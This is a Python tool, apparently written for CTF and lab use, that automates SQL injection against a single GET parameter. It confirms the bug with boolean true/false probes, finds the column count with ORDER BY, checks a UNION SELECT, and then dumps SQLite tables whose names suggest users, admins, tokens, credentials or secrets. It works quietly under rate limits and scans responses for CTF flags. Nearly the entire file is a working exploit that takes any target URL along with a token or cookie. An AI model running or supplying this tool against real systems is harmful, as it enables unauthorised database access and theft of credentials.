#!/usr/bin/env python3
"""sqlquick.py — low-volume SQLi fast-track for a single GET parameter, before sqlmap.

sqlmap is thorough and loud: dozens of requests per technique, easy to trip a lab's
rate limiter before you even know there's a bug. This does the minimum needed to go
from "maybe" to "confirmed, here's the data": one baseline, one quote, a handful of
boolean true/false pairs (stopping at the first strong differential instead of trying
every closing form), a binary-searched ORDER BY boundary, a numbered UNION SELECT to
verify it, then a bounded, priority-ordered SQLite dump through that UNION.

    python3 sqlquick.py --url "https://target/api/search?q=widget" --token "$TOKEN"
    python3 sqlquick.py --url "https://target/api/items?id=1&sort=name" --param id

A quote producing a DB error is never reported as SQLi on its own — only a true/false
behavioural differential confirms it. Every request is rate-limited (0.55s default
delay) and 429s get two backoff retries (~3s, ~6s); if throttling persists past that,
the run aborts as inconclusive rather than reporting a false negative.

Options:
  --url URL          target URL with the injectable parameter in its query string
  --param NAME        which query param to inject; inferred if the URL has exactly one
  --token / --cookie / --header "K: V" (repeatable)
  --out DIR           save every response here (default: sqlquick_out)
  --delay S           inter-request delay, default 0.55
  --retries N         429 backoff retries, default 2
  --max-cols N        upper bound for the ORDER BY binary search, default 30
  --max-rows N        row cap per dumped table, default 200
  --dump-all          dump every table, not just priority-matching ones (off by default)
"""
import argparse
import hashlib
import os
import re
import secrets
import sys
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests

requests.packages.urllib3.disable_warnings()

FLAG_RE = re.compile(r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,90}\}', re.I)
DBERR_RE = re.compile(
    r'sqlite3\.|SQLITE_ERROR|unrecognized token|near ".*"\s*:\s*syntax error|'
    r'sql syntax|ORA-\d{4,5}|pg_query|syntax error at or near|'
    r'unclosed quotation mark|OLE DB|mysql_fetch|Warning: mysql|'
    r'SqlException|System\.Data\.SqlClient|PDOException|database error',
    re.I)

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")

PRIORITY_KEYWORDS = ("flag", "secret", "config", "setting", "user", "admin",
                      "token", "note", "credential", "account")

# {seed} closes any string/paren context left open by the app's own query and the
# trailing comment eats whatever the app appends after our injected value.
FORMS = {
    "numeric":     "{seed} {sql}",
    "numeric-cmt": "{seed} {sql}--",
    "string-sq":   "{seed}' {sql}--",
    "paren":       "{seed}) {sql}--",
}


class RateLimited(Exception):
    pass


class Prober:
    def __init__(self, sess, base_url, param, headers, out_dir, delay, retries):
        self.sess = sess
        self.base_url = base_url
        self.param = param
        self.headers = headers
        self.out_dir = out_dir
        self.delay = delay
        self.retries = retries
        self.probes = 0
        self.http_requests = 0
        self.throttle_events = 0
        self.saved = 0
        self.flags = {}

    def url_for(self, value):
        parts = urlsplit(self.base_url)
        q = parse_qsl(parts.query, keep_blank_values=True)
        q = [(k, value if k == self.param else v) for k, v in q]
        return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))

    def send(self, url, tag):
        """One logical probe. May cost more than one HTTP request to 429 backoff."""
        self.probes += 1
        last = None
        for attempt in range(self.retries + 1):
            self.http_requests += 1
            try:
                r = self.sess.get(url, headers=self.headers, timeout=20,
                                   allow_redirects=False, verify=False)
            except Exception as e:
                last = e
                break
            last = r
            if r.status_code != 429:
                break
            self.throttle_events += 1
            if attempt < self.retries:
                wait = 3 * (attempt + 1)          # ~3s, then ~6s
                print("[!] 429 on %s — backing off %ds (retry %d/%d)"
                      % (tag, wait, attempt + 1, self.retries))
                time.sleep(wait)
        time.sleep(self.delay)
        self.save(tag, url, last)
        if isinstance(last, requests.Response) and last.status_code == 429:
            raise RateLimited("persistent 429 on probe %r (%s)" % (tag, url))
        return evidence(last)

    def save(self, tag, url, resp):
        self.saved += 1
        fn = os.path.join(self.out_dir, "%03d_%s.txt" % (self.saved, safe_name(tag)))
        with open(fn, "w", encoding="utf-8") as fh:
            fh.write("URL: %s\n" % url)
            if isinstance(resp, Exception):
                fh.write("ERROR: %s\n" % resp)
                return
            fh.write("HTTP %s\n" % resp.status_code)
            for k, v in resp.headers.items():
                fh.write("%s: %s\n" % (k, v))
            fh.write("\n" + (resp.text or ""))
        if isinstance(resp, requests.Response):
            for f in scan_flags(resp):
                self.flags.setdefault(f, []).append(tag)


def safe_name(s):
    return re.sub(r'[^a-zA-Z0-9]+', '_', s).strip('_')[:60] or "req"


def scan_flags(resp):
    hits = set(FLAG_RE.findall(resp.text or ""))
    for k, v in resp.headers.items():
        hits |= set(FLAG_RE.findall("%s: %s" % (k, v)))
    return hits


def evidence(resp):
    if isinstance(resp, Exception) or resp is None:
        return {"status": 0, "size": 0, "rows": None, "dberr": False, "text": ""}
    text = resp.text or ""
    rows = None
    try:
        j = resp.json()
        if isinstance(j, list):
            rows = len(j)
        elif isinstance(j, dict):
            for v in j.values():
                if isinstance(v, list):
                    rows = len(v)
                    break
    except Exception:
        pass
    return {"status": resp.status_code, "size": len(resp.content or b""),
            "rows": rows, "dberr": bool(DBERR_RE.search(text[:2000])), "text": text}


def resembles(a, b):
    if a["dberr"] or b["dberr"]:
        return a["dberr"] == b["dberr"]
    if a["rows"] is not None and b["rows"] is not None:
        return a["rows"] == b["rows"]
    return (a["status"] == b["status"]
            and abs(a["size"] - b["size"]) <= max(20, 0.05 * max(a["size"], b["size"], 1)))


def differs(a, b):
    return not resembles(a, b)


def infer_param(url, given):
    if given:
        return given
    q = parse_qsl(urlsplit(url).query, keep_blank_values=True)
    if len(q) == 1:
        return q[0][0]
    sys.exit("[!] URL has %d query params (%s) — pass --param to pick one"
              % (len(q), ", ".join(k for k, _ in q)))


def compose(form, seed, sql):
    return FORMS[form].format(seed=seed, sql=sql)


def order_by_boundary(pr, form, seed, base_ev, max_cols):
    lo, hi, last_ok = 1, max_cols, 0
    while lo <= hi:
        mid = (lo + hi) // 2
        ev = pr.send(pr.url_for(compose(form, seed, "ORDER BY %d" % mid)), "orderby-%d" % mid)
        ok = not ev["dberr"] and resembles(ev, base_ev)
        print("    ORDER BY %-3d -> %s" % (mid, "ok" if ok else "error/differs"))
        if ok:
            last_ok = mid
            lo = mid + 1
        else:
            hi = mid - 1
    return last_ok


def union_verify(pr, form, seed, col_count, start_tok, end_tok):
    marker = "%sOK%s" % (start_tok, end_tok)
    for pos in range(col_count):
        cols = ["NULL"] * col_count
        cols[pos] = "'%s'" % marker
        ev = pr.send(pr.url_for(compose(form, seed, "UNION SELECT " + ",".join(cols))),
                     "union-verify-col%d" % pos)
        if marker in ev["text"]:
            return pos
    return None


def sqlite_extract(pr, form, seed, col_count, payload_col, start_tok, end_tok, sql_expr):
    cols = ["NULL"] * col_count
    cols[payload_col] = "('%s' || COALESCE((%s),'') || '%s')" % (start_tok, sql_expr, end_tok)
    ev = pr.send(pr.url_for(compose(form, seed, "UNION SELECT " + ",".join(cols))), "extract")
    m = re.search(re.escape(start_tok) + r'(.*?)' + re.escape(end_tok), ev["text"], re.S)
    return m.group(1) if m else None


def is_priority(name):
    low = name.lower()
    return any(k in low for k in PRIORITY_KEYWORDS)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True)
    ap.add_argument("--param")
    ap.add_argument("--token")
    ap.add_argument("--cookie")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--out", default="sqlquick_out")
    ap.add_argument("--delay", type=float, default=0.55)
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--max-cols", type=int, default=30)
    ap.add_argument("--max-rows", type=int, default=200)
    ap.add_argument("--dump-all", action="store_true")
    a = ap.parse_args()

    os.makedirs(a.out, exist_ok=True)
    param = infer_param(a.url, a.param)
    seed = dict(parse_qsl(urlsplit(a.url).query, keep_blank_values=True)).get(param, "1")
    print("[*] target param: %s   seed value: %r" % (param, seed))

    headers = {"User-Agent": UA, "Accept": "application/json, */*"}
    if a.token:
        headers["Authorization"] = "Bearer " + a.token
    if a.cookie:
        headers["Cookie"] = a.cookie
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    pr = Prober(requests.Session(), a.url, param, headers, a.out, a.delay, a.retries)

    try:
        base_ev = pr.send(pr.url_for(seed), "baseline")
        print("[*] baseline: status=%s size=%s rows=%s dberr=%s"
              % (base_ev["status"], base_ev["size"], base_ev["rows"], base_ev["dberr"]))

        quote_ev = pr.send(pr.url_for(seed + "'"), "quote")
        quote_signal = quote_ev["dberr"] or differs(quote_ev, base_ev)
        print("[*] seed+quote: status=%s size=%s dberr=%s  (signal=%s, not proof by itself)"
              % (quote_ev["status"], quote_ev["size"], quote_ev["dberr"], quote_signal))

        winning_form = None
        for form in FORMS:
            true_ev = pr.send(pr.url_for(compose(form, seed, "AND 1=1")), "%s-true" % form)
            false_ev = pr.send(pr.url_for(compose(form, seed, "AND 1=2")), "%s-false" % form)
            strong = (differs(true_ev, false_ev)
                      and resembles(true_ev, base_ev)
                      and not resembles(false_ev, base_ev))
            print("[*] closing form %-12s true(status=%s,size=%s,rows=%s) "
                  "false(status=%s,size=%s,rows=%s) -> %s"
                  % (form, true_ev["status"], true_ev["size"], true_ev["rows"],
                     false_ev["status"], false_ev["size"], false_ev["rows"],
                     "STRONG DIFFERENTIAL" if strong else "no differential"))
            if strong:
                winning_form = form
                break                          # stop at the first strong differential

        if not winning_form:
            verdict = ("suspicious but unconfirmed (quote produced a DB-error-shaped "
                       "response, no boolean differential)" if quote_signal else
                       "no evidence of SQL injection on this parameter")
            print("\nRESULT: %s" % verdict)
            print("probes=%d  http_requests=%d  saved=%d" % (pr.probes, pr.http_requests, pr.saved))
            return 0

        print("\n[+] confirmed via boolean differential, closing form=%s" % winning_form)
        print("[*] finding column count (binary search, cap=%d)..." % a.max_cols)
        col_count = order_by_boundary(pr, winning_form, seed, base_ev, a.max_cols)
        if col_count == 0:
            print("RESULT: boolean differential confirmed, but ORDER BY 1 already errors — "
                  "cannot determine column count, stopping short of UNION verification")
            return 0
        if col_count == a.max_cols:
            print("[!] column count hit --max-cols (%d) — actual count may be higher, "
                  "re-run with a larger --max-cols" % a.max_cols)
        print("[+] column count: %d" % col_count)

        # Printable, random, all-alnum tokens — not raw control bytes: a JSON response
        # escapes char(31)/char(30)/char(29) to a literal ""-style 6-char sequence,
        # so a delimiter that has to survive a transport encoding needs to already be text.
        start_tok = "Q" + secrets.token_hex(4).upper()
        end_tok = "Q" + secrets.token_hex(4).upper()
        list_sep = "L" + secrets.token_hex(3).upper()
        col_sep = "C" + secrets.token_hex(3).upper()
        row_sep = "R" + secrets.token_hex(3).upper()
        payload_col = union_verify(pr, winning_form, seed, col_count, start_tok, end_tok)
        if payload_col is None:
            print("RESULT: boolean differential + column count confirmed, but UNION SELECT "
                  "marker never came back — verification failed, stopping short of extraction")
            print("probes=%d  http_requests=%d  saved=%d" % (pr.probes, pr.http_requests, pr.saved))
            return 0
        print("[+] UNION SELECT verified, marker landed in column %d" % payload_col)

        tables_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                      start_tok, end_tok,
                                      "SELECT group_concat(name, '%s') FROM sqlite_master "
                                      "WHERE type='table' AND name NOT LIKE 'sqlite_%%'" % list_sep)
        tables = [t for t in (tables_blob or "").split(list_sep) if t]
        print("[*] %d table(s): %s" % (len(tables), ", ".join(tables)))

        priority = [t for t in tables if is_priority(t)]
        rest = [t for t in tables if t not in priority]
        todo = priority if not a.dump_all else priority + rest
        if not a.dump_all and not priority:
            print("[*] no table name matched the priority keywords "
                  "(%s) — nothing to dump by default, re-run with --dump-all"
                  % ", ".join(PRIORITY_KEYWORDS))

        for table in todo:
            if not re.match(r'^[A-Za-z0-9_]+$', table):
                continue
            cols_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                        start_tok, end_tok,
                                        "SELECT group_concat(name, '%s') FROM pragma_table_info('%s')"
                                        % (list_sep, table))
            columns = [c for c in (cols_blob or "").split(list_sep) if c]
            if not columns:
                print("  [-] %s: could not enumerate columns, skipping" % table)
                continue
            col_expr = (" || '%s' || " % col_sep).join(
                "COALESCE(CAST(%s AS TEXT),'')" % c for c in columns)
            rows_sql = ("SELECT group_concat(rowblob, '%s') FROM "
                        "(SELECT (%s) AS rowblob FROM %s LIMIT %d)"
                        % (row_sep, col_expr, table, a.max_rows))
            rows_blob = sqlite_extract(pr, winning_form, seed, col_count, payload_col,
                                        start_tok, end_tok, rows_sql)
            rows = [r.split(col_sep) for r in (rows_blob or "").split(row_sep) if r]
            dump_path = os.path.join(a.out, "dump_%s.txt" % safe_name(table))
            with open(dump_path, "w", encoding="utf-8") as fh:
                fh.write(",".join(columns) + "\n")
                for row in rows:
                    fh.write(",".join(row) + "\n")
            print("  [+] %s: %d column(s), %d row(s) -> %s" % (table, len(columns), len(rows), dump_path))
            found = scan_flags_text(rows_blob or "")
            if found:
                for f in found:
                    print("      FLAG: %s" % f)
                if not a.dump_all:
                    print("[*] flag found — stopping priority-table extraction")
                    break

    except RateLimited as e:
        print("\n[!] %s" % e)
        print("RESULT: inconclusive due to rate limiting")
        print("probes=%d  http_requests=%d (incl. retries)  throttle_events=%d  saved=%d"
              % (pr.probes, pr.http_requests, pr.throttle_events, pr.saved))
        return 2

    print("\n" + "=" * 70)
    if pr.flags:
        for f, where in pr.flags.items():
            print("FLAG: %s   <- %s" % (f, ", ".join(where[:4])))
    print("probes=%d  http_requests=%d (incl. retries)  throttle_events=%d  saved=%d"
          % (pr.probes, pr.http_requests, pr.throttle_events, pr.saved))
    return 0


def scan_flags_text(text):
    return set(FLAG_RE.findall(text or ""))


if __name__ == "__main__":
    sys.exit(main())
